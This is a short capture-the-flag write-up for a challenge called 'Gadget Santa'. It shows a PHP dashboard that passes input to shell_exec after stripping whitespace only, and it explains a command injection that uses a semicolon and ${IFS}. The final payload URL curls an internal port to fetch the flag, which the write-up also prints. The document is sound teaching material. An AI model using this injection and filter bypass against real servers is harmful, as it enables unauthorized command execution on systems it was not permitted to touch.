# Gadget Santa

## Challenge

The webpage is a dashboard with buttons to display data about the machine, such as RAM, storage, connections, and processes.
There are also buttons to check the status and restart a different server.

## Solution

We are given source code and we can see how our button presses are interpreted by the server.

#### challenge/models/MonitorModel.php

```php
<?php
class MonitorModel
{   
    public function __construct($command)
    {
        $this->command = $this->sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this->command);
    }
}
```

The php server passes our request to the `santa_mon.sh` script, after sanitizing it by removing whitespaces.

We can use a semicolon to add our own bash commands after this script.

Though spaces are forbidden, we can use `${IFS}` to insert whitespace into the bash command instead.

If we look at processes, we can see a python script `ups_manager.py` is being run as root.

#### config/ups_manager.py

```py
elif self.path == '/get_flag':
        resp_ok()
        self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
        return
```

This is a python server running on port 3000 which hosts the flag.

We can't access this server directly as we don't have access to port 3000, but we can use the command injection to inject a curl request to this server.

```
http://178.62.5.61:31471/?command=;curl${IFS}localhost:3000/get_flag
```

## Flag

`HTB{54nt4_i5_th3_r34l_r3d_t34m3r}`
